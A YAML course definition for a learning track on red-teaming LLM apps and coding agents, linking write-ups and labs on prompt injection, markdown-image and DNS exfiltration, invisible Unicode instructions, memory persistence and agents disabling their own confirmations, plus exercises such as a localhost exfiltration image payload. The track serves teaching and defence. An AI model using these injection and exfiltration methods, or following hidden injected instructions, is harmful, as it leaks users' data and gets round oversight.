@@ -1,0 +1,365 @@
+id: ai-red-teaming
+title: 'AI red teaming: LLM apps and agents'
+tagline: Attack and defend LLM apps and coding agents the way Johann Rehberger does — then design them so the attacks don't land.
+area: ai-security
+level: intermediate
+mentors: [rehberger]
+chapters:
+  - id: prompt-injection-basics
+    title: Why prompt injection exists
+    summary: Instructions and data share one channel. Direct vs indirect injection, and why it is still unsolved.
+    difficulty: 2
+    topics: [prompt-injection, llm-fundamentals]
+    outcomes:
+      - Explain direct vs indirect prompt injection with one real example of each.
+      - Explain why filtering and "better system prompts" don't fix it.
+      - Name the OWASP LLM01 mitigations and their limits.
+    steps:
+      - id: ai-injections-basics
+        title: 'AI Injections: direct and indirect prompt injection'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/'
+        minutes: 12
+        focus: The difference between the two kinds, and why "the model can't tell instructions from data" is the root cause.
+      - id: prompt-injection-intro-video
+        title: 'Video: prompt injections — an introduction'
+        type: watch
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2023/prompt-injection-an-introduction-video/'
+        minutes: 15
+        focus: Watch the demos; write down each attacker-controlled input channel he uses.
+      - id: prompt-injection-explained
+        title: Prompt injection explained
+        type: read
+        by: simonw
+        url: 'https://simonwillison.net/2023/May/2/prompt-injection-explained/'
+        minutes: 20
+        focus: Why prompt injection is unlike SQL injection — there is no reliable escaping.
+      - id: owasp-llm01
+        title: 'OWASP LLM01:2025 Prompt Injection'
+        type: read
+        by: owasp-genai
+        url: 'https://genai.owasp.org/llmrisk/llm01-prompt-injection/'
+        minutes: 12
+        focus: The attack scenarios and the mitigation list — mark which mitigations reduce impact versus prevent the attack.
+    practice:
+      title: 'Lab: exploiting LLM APIs with excessive agency'
+      type: lab
+      url: 'https://portswigger.net/web-security/llm-attacks/lab-exploiting-llm-apis-with-excessive-agency'
+      minutes: 30
+      steps:
+        - Ask the lab's chatbot which APIs it can call.
+        - Find the one that does more than it should and use it to complete the lab goal.
+        - Write one sentence on what design change would have prevented it.
+
+  - id: data-exfiltration
+    title: Data exfiltration channels
+    summary: How an injected instruction gets your data out — markdown images, links, tools, DNS.
+    difficulty: 3
+    topics: [data-exfiltration]
+    outcomes:
+      - Demonstrate markdown-image exfiltration end to end.
+      - List at least four exfiltration channels in LLM apps and agents.
+      - Evaluate URL allowlists and image proxies as mitigations.
+    steps:
+      - id: bing-chat-exfil
+        title: 'Bing Chat: data exfiltration exploit explained'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/'
+        minutes: 12
+        focus: The full chain — injection source, the image URL carrying data, and the fix Microsoft shipped.
+      - id: plugin-exfil
+        title: 'ChatGPT plugins: exfiltration via images and cross-plugin request forgery'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/'
+        minutes: 12
+        focus: How one plugin's output can drive another plugin — the start of "tool chaining" attacks.
+      - id: exfil-video
+        title: 'Video: data exfiltration vulnerabilities in LLM apps'
+        type: watch
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2023/video-data-exfiltration-vulns-in-llm-applictions/'
+        minutes: 20
+        focus: Compare how Bing Chat, ChatGPT and Claude were each vulnerable and fixed.
+      - id: openai-exfil-mitigations
+        title: OpenAI explains URL-based exfiltration mitigations
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/'
+        minutes: 12
+        focus: What a vendor-scale mitigation looks like, and where Johann sees gaps.
+    practice:
+      title: Exfiltrate from a toy chatbot (locally)
+      type: walkthrough
+      minutes: 40
+      steps:
+        - Start a local listener — `python3 -m http.server 9999` — and leave it running.
+        - Build or reuse a tiny chat page that renders the model's markdown (any LLM, or hard-code a "model" reply).
+        - Put an instruction in a document the bot reads that makes it emit `![x](http://localhost:9999/?d=SECRET)`.
+        - Watch the listener log the secret, then add a URL allowlist and confirm the image no longer loads.
+
+  - id: hidden-instructions
+    title: Hidden instructions and invisible text
+    summary: Unicode tags and other tricks that hide instructions from humans but not from models.
+    difficulty: 3
+    topics: [prompt-injection]
+    outcomes:
+      - Encode and decode text with Unicode tag characters.
+      - Explain why invisible instructions in skills, PRs and docs are dangerous for agents.
+      - Write a check that flags hidden characters.
+    steps:
+      - id: ascii-smuggler-tool
+        title: 'ASCII Smuggler: crafting invisible text'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/'
+        minutes: 12
+        focus: How Unicode tag characters work and which models read them.
+      - id: sneaky-bits
+        title: 'Sneaky Bits: advanced data smuggling'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/sneaky-bits-and-ascii-smuggler/'
+        minutes: 12
+        focus: Variation selectors and other encodings beyond tag characters.
+      - id: scary-agent-skills
+        title: 'Scary agent skills: hidden Unicode in skills'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2026/scary-agent-skills/'
+        minutes: 12
+        focus: The supply-chain angle — and the detection approach he proposes.
+    practice:
+      title: Smuggle and catch
+      type: walkthrough
+      url: 'https://embracethered.com/blog/ascii-smuggler.html'
+      minutes: 30
+      steps:
+        - Use the ASCII Smuggler tool to hide one instruction inside an innocent sentence.
+        - Paste it into a text file and check `cat`, your editor and git diff — what do you see?
+        - Write a small script (or lint rule) that fails when a file contains Unicode tag characters (U+E0000–U+E007F).
+
+  - id: memory-and-persistence
+    title: Memory and persistence attacks
+    summary: When an injection writes to long-term memory, the compromise outlives the conversation.
+    difficulty: 3
+    topics: [prompt-injection, data-exfiltration]
+    outcomes:
+      - Explain how memory tools turn a one-off injection into persistence.
+      - Describe delayed tool invocation and why it defeats simple confirmations.
+    steps:
+      - id: hacking-memories
+        title: 'ChatGPT: hacking memories with prompt injection'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2024/chatgpt-hacking-memories/'
+        minutes: 10
+        focus: Which input channels could write memories, and what the attacker gains.
+      - id: spaiware
+        title: 'SpAIware: spyware injection into long-term memory'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/'
+        minutes: 12
+        focus: Persistence plus exfiltration — every future chat leaks.
+      - id: gemini-delayed-invocation
+        title: "Hacking Gemini's memory with delayed tool invocation"
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/gemini-memory-persistence-prompt-injection/'
+        minutes: 12
+        focus: How "do it when the user says yes later" bypasses confirmation prompts.
+    practice:
+      title: Threat-model a memory feature
+      type: walkthrough
+      minutes: 25
+      steps:
+        - Pick an assistant you use that has memory.
+        - List every way untrusted text can reach it (web, files, email, tools).
+        - For each, decide whether it can write memory, and what would stop it.
+
+  - id: agents-lethal-trifecta
+    title: 'Agents: the lethal trifecta and the AI kill chain'
+    summary: Private data + untrusted content + a way out = compromise. How agents chain it together.
+    difficulty: 4
+    topics: [agent-security]
+    outcomes:
+      - Identify the lethal trifecta in an agent design.
+      - Walk through an AI kill chain from injection to impact.
+      - Explain the risks MCP servers add for clients.
+    steps:
+      - id: lethal-trifecta
+        title: The lethal trifecta for AI agents
+        type: read
+        by: simonw
+        url: 'https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/'
+        minutes: 12
+        focus: The three ingredients, and why removing any one is the only reliable fix.
+      - id: openhands-trifecta
+        title: OpenHands and the lethal trifecta
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/openhands-the-lethal-trifecta-strikes-again/'
+        minutes: 12
+        focus: A real coding agent leaking tokens — map each step to a trifecta ingredient.
+      - id: devin-kill-chain
+        title: 'AI kill chain in action: Devin exposes ports'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/devin-ai-kill-chain-exposing-ports/'
+        minutes: 12
+        focus: The kill-chain stages Johann uses; reuse them for your own write-ups.
+      - id: mcp-confused-clients
+        title: 'MCP: untrusted servers and confused clients'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/model-context-protocol-security-risks-and-exploits/'
+        minutes: 15
+        focus: Tool poisoning and what a client should and shouldn't trust from an MCP server.
+      - id: month-of-ai-bugs
+        title: 'Wrap-up: the Month of AI Bugs'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/'
+        minutes: 15
+        focus: Patterns across 30 days of agent bugs — which vendors fixed what, and how fast.
+    practice:
+      title: 'Lab: indirect prompt injection'
+      type: lab
+      url: 'https://portswigger.net/web-security/llm-attacks/lab-indirect-prompt-injection'
+      minutes: 40
+      steps:
+        - Find where the lab's agent reads attacker-controlled content.
+        - Plant an instruction that makes it act on the victim's behalf.
+        - Name the trifecta ingredients present in the lab.
+
+  - id: coding-agents-computer-use
+    title: Coding agents and computer use
+    summary: From prompt injection to remote code execution and C2 in developer tools.
+    difficulty: 4
+    topics: [agent-security, data-exfiltration]
+    outcomes:
+      - Explain how a coding agent reaches remote code execution via settings and config files.
+      - Describe DNS-based exfiltration from a sandboxed agent.
+      - Explain TOCTOU risks in computer-use agents.
+    steps:
+      - id: zombais
+        title: 'ZombAIs: from prompt injection to C2 with Claude computer use'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2024/claude-computer-use-c2-the-zombais-are-coming/'
+        minutes: 12
+        focus: How a web page turns a computer-use agent into a botnet node.
+      - id: copilot-rce
+        title: 'GitHub Copilot: RCE via prompt injection (CVE-2025-53773)'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/'
+        minutes: 12
+        focus: The agent editing its own settings to disable confirmations — a pattern to look for everywhere.
+      - id: claude-code-dns
+        title: 'Claude Code: data exfiltration with DNS (CVE-2025-55284)'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/'
+        minutes: 10
+        focus: Why "allowed" commands like ping can still leak data.
+      - id: agentic-probllms-39c3
+        title: 'Agentic ProbLLMs (39C3 talk)'
+        type: watch
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2025/39c3-agentic-probllms-exploiting-computer-use-and-coding-agents/'
+        minutes: 45
+        focus: The full talk — collect the defensive recommendations at the end.
+      - id: toctou-computer-use
+        title: 'Computer-use and TOCTOU: what you click is not what you get'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2026/toctou-agent-what-you-click-is-not-what-you-get/'
+        minutes: 12
+        focus: Time-of-check vs time-of-use when an agent acts on a screenshot.
+    practice:
+      title: Audit your own coding agent setup
+      type: walkthrough
+      minutes: 40
+      steps:
+        - List what your coding agent can read (repos, secrets, home dir), what untrusted content it sees (issues, web, deps), and how it can talk to the outside (network, git push, DNS).
+        - Check which settings or config files the agent itself could edit to loosen its permissions.
+        - Tighten one thing (deny list, sandbox, network allowlist) and note the trade-off.
+
+  - id: defending-llm-apps
+    title: Defending LLM apps by design
+    summary: Mitigations that hold up — design patterns, capability limits, and threat modeling.
+    difficulty: 4
+    topics: [agent-security, threat-modeling]
+    outcomes:
+      - Apply at least three design patterns that constrain what injected text can do.
+      - Explain the CaMeL approach and its trade-offs.
+      - Map an LLM app's risks with OWASP LLM Top 10 and MITRE ATLAS.
+    steps:
+      - id: trust-no-ai
+        title: 'Trust No AI: prompt injection along the CIA triad'
+        type: read
+        by: rehberger
+        url: 'https://embracethered.com/blog/posts/2024/trust-no-ai-prompt-injection-along-the-cia-security-triad-paper/'
+        minutes: 15
+        focus: Classify impacts by confidentiality, integrity and availability.
+      - id: design-patterns
+        title: Design patterns for securing LLM agents
+        type: read
+        by: simonw
+        url: 'https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/'
+        minutes: 15
+        focus: The six patterns (action-selector, plan-then-execute, map-reduce, dual LLM, code-then-execute, context minimisation).
+      - id: design-patterns-paper
+        title: Design patterns paper (arXiv)
+        type: read
+        by: simonw
+        url: 'https://arxiv.org/html/2506.08837'
+        minutes: 30
+        focus: The case studies section — pick the one closest to something you'd build.
+      - id: camel
+        title: CaMeL — a new direction for prompt injection
+        type: read
+        by: simonw
+        url: 'https://simonwillison.net/2025/Apr/11/camel/'
+        minutes: 15
+        focus: Capabilities and data-flow tracking instead of detection.
+      - id: owasp-excessive-agency
+        title: 'OWASP LLM06:2025 Excessive Agency'
+        type: read
+        by: owasp-genai
+        url: 'https://genai.owasp.org/llmrisk/llm062025-excessive-agency/'
+        minutes: 10
+        focus: Excessive functionality, permissions and autonomy — three separate knobs.
+      - id: mitre-atlas
+        title: MITRE ATLAS
+        type: read
+        by: mitre-atlas
+        url: 'https://atlas.mitre.org/'
+        minutes: 20
+        focus: Browse the matrix; find the techniques you've seen in this track.
+    practice:
+      title: 'Lab: insecure output handling'
+      type: lab
+      url: 'https://portswigger.net/web-security/llm-attacks/lab-exploiting-insecure-output-handling-in-llms'
+      minutes: 40
+      steps:
+        - Exploit the lab, then write which design pattern from this chapter would have stopped it.
+
+capstone:
+  title: Red-team and redesign a small agent
+  summary: Build (or pick) a small local agent with tools, break it, and redesign it so your attacks fail.
+  outcomes:
+    - A threat model naming trust boundaries and lethal-trifecta ingredients.
+    - At least two working attacks (injection → impact) with reproduction steps.
+    - A redesign using the chapter's patterns, with the attacks re-run.
+    - A write-up in Johann's kill-chain format.
+  steps:
+    - Build a tiny agent with web fetch + file read + one outbound action, or use an open-source one.
+    - Threat-model it, then attack it using techniques from chapters 2–6.
+    - Apply two design patterns and re-run the attacks.
+    - Write it up — what broke, why, what fixed it, what is still open.
